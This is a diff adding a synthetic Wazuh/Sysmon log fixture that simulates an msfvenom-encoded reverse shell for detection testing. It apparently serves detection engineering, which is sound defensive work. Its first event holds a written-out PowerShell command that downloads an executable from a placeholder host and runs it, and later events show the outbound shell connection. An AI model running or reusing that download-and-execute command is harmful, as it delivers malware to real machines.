@@ -1,0 +1,242 @@
+{
+  "_metadata": {
+    "attack_id": "T1027",
+    "variation": "001",
+    "name": "MSFVenom Encoded Payload - Shikata Ga Nai",
+    "description": "Attacker uses msfvenom with shikata_ga_nai encoder (5 iterations) to obfuscate reverse shell payload for AV evasion",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "defense-evasion",
+    "tool": "msfvenom",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - PowerShell download cradle (encoded payload)",
+      "sequence": 1,
+      "timestamp": "2026-02-11T03:44:56.000Z",
+      "log": {
+        "timestamp": "2026-02-11T03:44:56.000Z",
+        "rule": {
+          "level": 12,
+          "description": "Powershell was used to delete files or directories",
+          "id": "100200",
+          "mitre": {
+            "id": [
+              "T1059.001",
+              "T1071.001"
+            ],
+            "tactic": [
+              "Execution",
+              "Command and Control"
+            ],
+            "technique": [
+              "PowerShell",
+              "Web Protocols"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows",
+            "powershell"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707635096.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-11 03:44:56.000",
+              "processGuid": "{ENC-PS-GUID}",
+              "processId": "8901",
+              "image": "C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+              "commandLine": "powershell -Command \\\"Invoke-WebRequest -Uri http://198.51.100.110:8080/encoded_shell.exe -OutFile C:\\\\Users\\\\Public\\\\encoded.exe; Start-Process C:\\\\Users\\\\Public\\\\encoded.exe\\\"",
+              "currentDirectory": "C:\\\\Windows\\\\System32\\\\",
+              "user": "CORP\\\\Administrator",
+              "integrityLevel": "High",
+              "hashes": "SHA256=GHI456JKL789",
+              "parentProcessGuid": "{PSE-GUID-3}",
+              "parentProcessId": "3456",
+              "parentImage": "C:\\\\Windows\\\\csaE.exe",
+              "parentCommandLine": "C:\\\\Windows\\\\csaE.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 3 - Encoded payload network connection",
+      "sequence": 2,
+      "timestamp": "2026-02-11T03:44:58.500Z",
+      "log": {
+        "timestamp": "2026-02-11T03:44:58.500Z",
+        "rule": {
+          "level": 5,
+          "description": "Sysmon - Event 3: Network connection to external IP",
+          "id": "100103",
+          "mitre": {
+            "id": [
+              "T1095"
+            ],
+            "tactic": [
+              "Command and Control"
+            ],
+            "technique": [
+              "Non-Application Layer Protocol"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707635098.500001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "3",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-11 03:44:58.500",
+              "processGuid": "{ENC-SHELL-GUID}",
+              "processId": "5678",
+              "image": "C:\\\\Users\\\\Public\\\\encoded.exe",
+              "user": "CORP\\\\Administrator",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIsIpv6": "false",
+              "sourceIp": "198.51.100.20",
+              "sourceHostname": "WS01",
+              "sourcePort": "49516",
+              "sourcePortName": "-",
+              "destinationIsIpv6": "false",
+              "destinationIp": "198.51.100.110",
+              "destinationHostname": "-",
+              "destinationPort": "4447",
+              "destinationPortName": "-"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - cmd.exe spawned by encoded payload",
+      "sequence": 3,
+      "timestamp": "2026-02-11T03:44:58.564Z",
+      "log": {
+        "timestamp": "2026-02-11T03:44:58.564Z",
+        "rule": {
+          "level": 12,
+          "description": "Windows command prompt started by an abnormal process",
+          "id": "100150",
+          "mitre": {
+            "id": [
+              "T1059.003",
+              "T1027"
+            ],
+            "tactic": [
+              "Execution",
+              "Defense Evasion"
+            ],
+            "technique": [
+              "Windows Command Shell",
+              "Obfuscated Files or Information"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707635098.564002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-11 03:44:58.564",
+              "processGuid": "{ENC-CMD-GUID}",
+              "processId": "9012",
+              "image": "C:\\\\Windows\\\\SysWOW64\\\\cmd.exe",
+              "commandLine": "cmd",
+              "currentDirectory": "C:\\\\Windows\\\\System32\\\\",
+              "user": "CORP\\\\Administrator",
+              "integrityLevel": "High",
+              "hashes": "SHA256=LEGITIMATE_CMD_HASH",
+              "parentProcessGuid": "{ENC-SHELL-GUID}",
+              "parentProcessId": "5678",
+              "parentImage": "C:\\\\Users\\\\Public\\\\encoded.exe",
+              "parentCommandLine": "C:\\\\Users\\\\Public\\\\encoded.exe"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
